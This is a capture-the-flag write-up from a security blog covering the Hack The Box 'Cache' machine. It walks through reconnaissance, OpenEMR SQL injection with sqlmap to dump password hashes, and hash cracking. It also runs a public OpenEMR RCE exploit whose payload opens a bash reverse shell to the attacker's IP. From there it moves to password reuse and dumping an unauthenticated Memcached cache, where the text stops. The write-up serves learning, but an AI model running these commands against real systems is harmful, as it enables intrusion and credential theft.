<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HTB - Cache Write-up | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Cache Write-up" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This was a medium-difficulty box and good learning path for: Client-side Auth Source Code Review VHOST Enumeration OpenEMR &lt; 5.0.1 - Multiple SQLi OpenEMR &lt; 5.0.1 - Authenticatd Remote Code Execution Memcached Exploit Docker Privilege Escalation" /><meta property="og:description" content="This was a medium-difficulty box and good learning path for: Client-side Auth Source Code Review VHOST Enumeration OpenEMR &lt; 5.0.1 - Multiple SQLi OpenEMR &lt; 5.0.1 - Authenticatd Remote Code Execution Memcached Exploit Docker Privilege Escalation" /><link rel="canonical" href="https://bigb0sss.github.io/posts/htb-cache-writeup/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/htb-cache-writeup/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/htb/cache/01_infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-25T11:25:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/htb/cache/01_infocard.png" /><meta property="twitter:title" content="HTB - Cache Write-up" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"bigb0ss"},"description":"This was a medium-difficulty box and good learning path for: Client-side Auth Source Code Review VHOST Enumeration OpenEMR &lt; 5.0.1 - Multiple SQLi OpenEMR &lt; 5.0.1 - Authenticatd Remote Code Execution Memcached Exploit Docker Privilege Escalation","@type":"BlogPosting","headline":"HTB - Cache Write-up","dateModified":"2020-10-25T11:25:00-04:00","datePublished":"2020-10-25T11:25:00-04:00","url":"https://bigb0sss.github.io/posts/htb-cache-writeup/","image":"https://bigb0sss.github.io/assets/img/post/htb/cache/01_infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/htb-cache-writeup/"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Cache Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Cache Write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 25, 2020" > Oct 25 <i class="unloaded">2020-10-25T11:25:00-04:00</i> </span> by <span class="author"> bigb0ss </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 15, 2020" > Nov 15 <i class="unloaded">2020-11-15T18:13:06-05:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/01_infocard.png" class="post-preview-img"><p>This was a medium-difficulty box and good learning path for:</p><ul><li>Client-side Auth Source Code Review<li>VHOST Enumeration<li>OpenEMR &lt; 5.0.1 - Multiple SQLi<li>OpenEMR &lt; 5.0.1 - Authenticatd Remote Code Execution<li>Memcached Exploit<li>Docker Privilege Escalation</ul><h2 id="recon">Recon</h2><h3 id="nmap">Nmap</h3><p>Let’s begin with an initial port scan:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.188
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 16:34 EDT
Nmap scan report for 10.10.10.188
Host is up (0.080s latency).
Not shown: 65533 closed ports

PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><h3 id="interesting-ports">Interesting Ports</h3><ul><li>HTTP (80/TCP) - Cache Web Page.</ul><h3 id="login-page">Login Page</h3><p>The HTTP (80/TCP) page has a menu for <code class="language-plaintext highlighter-rouge">Login</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/02_login.png" alt="image" /></p><p>When I inspected the source code of the login page, there was a script called <code class="language-plaintext highlighter-rouge">functionality.js</code> which was responsible for the <code class="language-plaintext highlighter-rouge">client-side</code> authentication.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/03_source-1.png" alt="image" /></p><p>The following username and password (ash:H@v3_fun) found within the script:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    
    <span class="kd">var</span> <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    
    <span class="kd">function</span> <span class="nx">checkCorrectPassword</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Password</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">H@v3_fun</span><span class="dl">'</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_correctPassword</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">checkCorrectUsername</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">Username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">Username</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ash</span><span class="dl">"</span><span class="p">){</span>
            <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username didn't Match</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">error_username</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>Once logged in, there was the following static page:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/04_after-login.png" alt="image" /></p><p>It was a bit of rabbit-hole.</p><h3 id="vhost">VHOST</h3><p>I also performed some directory brute-forceing against the <code class="language-plaintext highlighter-rouge">http://10.10.10.188/</code>; however, nothing seemed to be interesting.</p><p>Then, I moved onto performing some of the potential subdomain enumerations, which didn’t get me to far either.</p><p>Next, I wanted to check for any potential VHOST (Virtural Hosting) for the domain.</p><p>Modifed my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to add <code class="language-plaintext highlighter-rouge">cache.htb</code> to <code class="language-plaintext highlighter-rouge">10.10.10.188</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>127.0.0.1       localhost
127.0.1.1       kali

<span class="c">### htb</span>
10.10.10.188    cache.htb

<span class="c">### The following lines are desirable for IPv6 capable hosts</span>
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre></table></code></div></div><p>Once it was done, using <code class="language-plaintext highlighter-rouge">FFUF</code>, I started to look for any potential VHOST associated with the Cache system.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>./ffuf <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.htb"</span> <span class="nt">-u</span> http://cache.htb <span class="nt">-fw</span> 902
<span class="go">
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://cache.htb
 :: Header           : Host: FUZZ.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 902
________________________________________________

hms                     [Status: 302, Size: 0, Words: 1, Lines: 1]
</span></pre></table></code></div></div><p>This found the permanent redirection (302) for <code class="language-plaintext highlighter-rouge">hms.htb</code>. I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> again to add <code class="language-plaintext highlighter-rouge">hms.htb</code> to <code class="language-plaintext highlighter-rouge">10.10.10.188</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>127.0.0.1       localhost
127.0.1.1       kali

<span class="c">### htb</span>
10.10.10.188    cache.htb hms.htb

<span class="c">### The following lines are desirable for IPv6 capable hosts</span>
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre></table></code></div></div><p>Then, I was able to access OpenEMR login page via <code class="language-plaintext highlighter-rouge">http:/hms.htb</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/05_openemr.png" alt="image" /></p><h2 id="initial-foothold">Initial Foothold</h2><p>By Google searching about OpenEMR, I was able to discover some good amount of known vulnerabilities associated with this product.</p><ul><li><p><a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">OpenEMR Vulnerability Disclosure Report</a></p><li><p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc">OpenEMR Simulated Attack Video</a></p></ul><p>In a nutshell, the product was written in PHP and heavily vulnerable to multiple SQLi attacks because the codes were not sanitizing the user input properly, and most of the SQL syntax were not written in parameterized queries.</p><p>Additionally, the Vulnerability Disclosure Report also indicated that by browsing <code class="language-plaintext highlighter-rouge">/admin.php</code>, one can view the information about the installed OpenEMR product, such as the version info.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/06_version.png" alt="image" /></p><h3 id="sqli-openemr">SQLi (OpenEMR)</h3><p>According the the “OpenEMR Simulated Attack” video, we could bypass the authentication by visiting the <code class="language-plaintext highlighter-rouge">/portal</code> page and access pages like <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> in order to identify the SQLi vuln.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/07_portal.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/08_add-edit.png" alt="image" /></p><p>By adding <code class="language-plaintext highlighter-rouge">?eid='</code> at the end of the above page, we can cause the SQL error.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/09_sql-error.png" alt="image" /></p><p>Then, capture the above <code class="language-plaintext highlighter-rouge">GET</code> request with Burp in order to feed that <code class="language-plaintext highlighter-rouge">GET</code> request to the <code class="language-plaintext highlighter-rouge">sqlmap</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/10_get.png" alt="image" /></p><p><b>sqlmap</b></p><p>Save the <code class="language-plaintext highlighter-rouge">GET</code> into a file such as <code class="language-plaintext highlighter-rouge">openemr.req</code> and let’s feed that into the <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if we can retrieve what kind of databases from the application.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> openemr.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">--dbs</span>
</pre></table></code></div></div><p>This found two (2) databases: 1) information_schema; 2) openemr</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/11_db.png" alt="image" /></p><p>Then, we can query for tables for the database <code class="language-plaintext highlighter-rouge">openemr</code> and by dumping <code class="language-plaintext highlighter-rouge">users_secure</code> table, we can obtain the password hash for the <code class="language-plaintext highlighter-rouge">openemr_admin</code> user.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> openemr.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-D</span> openemr <span class="nt">--tables</span>
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> openemr.req <span class="nt">--threads</span><span class="o">=</span>10 <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">--dump</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/12_admin.png" alt="image" /></p><p>Upon obatin the hash, we can use <code class="language-plaintext highlighter-rouge">john</code> to crack it. It turned out to be <code class="language-plaintext highlighter-rouge">xxxxxx</code> in cleartext.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>john pass.hash 
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
xxxxxx           (?)
1g 0:00:00:00 DONE 2/3 (2020-10-25 22:26) 3.571g/s 4114p/s 4114c/s 4114C/s water..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</span></pre></table></code></div></div><h3 id="rce-openemr">RCE (OpenEMR)</h3><p>There was a <a href="https://www.exploit-db.com/exploits/45161">POC exploit</a> for the authentication RCE for OpenEMR &lt; 5.0.1.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python openemr-rce.py http://hms.htb <span class="nt">-u</span> <span class="s1">'openemr_admin'</span> <span class="nt">-p</span> <span class="s1">'xxxxxx'</span> <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/13_rce.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/14_rce-2.png" alt="image" /></p><p>We now successfully gained RCE from the Cache box.</p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="www-data--ash-password-reuse">www-data –&gt; ash (Password Reuse)</h3><p>When we look at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> for the existing users, we can see that <code class="language-plaintext highlighter-rouge">ash</code> exists.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
<span class="go">cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
...snip...
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
</span></pre></table></code></div></div><p><b>user.txt</b></p><p>We know that his password was once found within the <code class="language-plaintext highlighter-rouge">client-side</code> JavaScript. After spawning a TTY shell, we can now change the user context to <code class="language-plaintext highlighter-rouge">ash</code> and read the <code class="language-plaintext highlighter-rouge">user.txt</code> file.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="gp">&lt;ain$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>        
<span class="gp">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><span class="w"> </span>su <span class="nt">-l</span> ash
<span class="go">su -l ash
Password: H@v3_fun

</span><span class="gp">ash@cache:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">id
uid=1000(ash) gid=1000(ash) groups=1000(ash)
</span><span class="gp">ash@cache:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">cat user.txt
</span><span class="gp">62d&lt;REDACTED&gt;</span>6f2
</pre></table></code></div></div><h3 id="ash--luffy-memcached">ash –&gt; luffy (Memcached)</h3><p>Further enumeration identified that the Memcached service was running on the <code class="language-plaintext highlighter-rouge">localhost:11211</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/cache/15_mem.png" alt="image" /></p><blockquote><p><strong>NOTE</strong>: Memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.</p></blockquote><p>The service allowed access without authentication using <code class="language-plaintext highlighter-rouge">Telnet</code>. Detailed blog post to exploit the Memcached server can be found <a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">here</a>.</p><p>Using the <code class="language-plaintext highlighter-rouge">stats slabs</code> command, we can see the list of the Memcached information.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">ash@cache:~$</span><span class="w"> </span>telnet 127.0.0.1 11211
<span class="go">telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats slabs
stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 5
STAT 1:free_chunks 10917
STAT 1:free_chunks_end 0
STAT 1:mem_requested 371
STAT 1:get_hits 0
STAT 1:cmd_set 2240
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048576
END
</span></pre></table></code></div></div><p>We will be interested in the store keys. Using the <code class="language-plaintext highlighter-rouge">stats cachedump 1 0</code>, we can retrieve them.</p><blockquote><p><strong>NOTE</strong>: 1 = Slab ID. 0 = It represents the number of keys you want to dump, 0 will dump all the keys present in the slab ID respectively.</p></blockquote><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">stats cachedump 1 0
</span><span class="gp">ITEM link [21 b;</span><span class="w"> </span>0 s]
<span class="gp">ITEM user [5 b;</span><span class="w"> </span>0 s]
<span class="gp">ITEM passwd [9 b;</span><span class="w"> </span>0 s]
<span class="gp">ITEM file [7 b;</span><span class="w"> </span>0 s]
<span class="gp">ITEM account [9 b;</span><span class="w"> </span>0 s]
<span class="go">END
